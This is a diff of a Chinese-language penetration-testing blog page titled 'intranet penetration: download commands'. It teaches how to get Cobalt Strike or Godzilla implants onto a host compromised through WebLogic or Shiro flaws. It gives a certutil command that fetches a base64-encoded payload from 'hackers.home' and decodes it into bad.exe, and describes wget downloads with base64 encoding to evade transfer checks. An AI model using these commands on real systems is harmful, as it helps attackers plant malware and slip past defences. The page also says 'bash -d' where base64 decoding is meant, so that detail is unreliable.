@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Windows-Cmd-Download | Cupid&#39;s Blog</title>
+  <title itemprop="name">内网渗透-Download命令学习 | Cupid&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -354,7 +354,7 @@
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      Windows-Cmd-Download</h1>
+      内网渗透-Download命令学习</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -380,7 +380,7 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>当我们拿到了一个weblogic,又或者是shiro漏洞后，如果没有上传界面的利用，又该如何上cs马、哥斯拉马呢？</p>
+          <h3><span id="windows篇">Windows篇</span></h3><p>当我们拿到了一个weblogic,又或者是shiro漏洞后，如果没有上传界面的利用，又该如何上cs马、哥斯拉马呢？</p>
 <p>Windows的命令行远程下载神器-CertUtil</p>
 <p>Windows中有一个名为CertUtil的内置程序，可用于在Windows中管理证书。使用此程序可以在Windows中安装、备份，删除，管理和执行与证书存储相关的各种功能。</p>
 <p>CertUtil的一个特性是能够从远程URL上下载证书或其他任何文件。</p>
@@ -389,7 +389,12 @@
 <p>先通过base64对恶意文件进行编码，使得恶意代码看起来像是无害的文本文件，再使用CertUtil.exe下载后对其进行解码。下载后再使用:</p>
 <p>Certutil.exe -decode将Base64编码文件解码为可执行文件。</p>
 <pre><code>certutil -urlcache -split -f &quot;https://hackers.home/badcontent.txt&quot; bad.txt
-certutil -decode bad.txt bad.exe</code></pre>
+certutil -decode bad.txt bad.exe</code></pre><h3><span id="linux篇">Linux篇</span></h3><p>linux直接采用wget+url的方式就可以轻松的下载到我们需要传上去的马。</p>
+<p>另外万一传输中有检查与限制，可以直接使用linux内置的:</p>
+<p>base64 +文件名</p>
+<p>就可以把文件中的内容进行加密了。</p>
+<p>当然也可以再使用bash -d进行解密。再使用echo &gt; 文件名就可以直接写入到文件内。</p>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
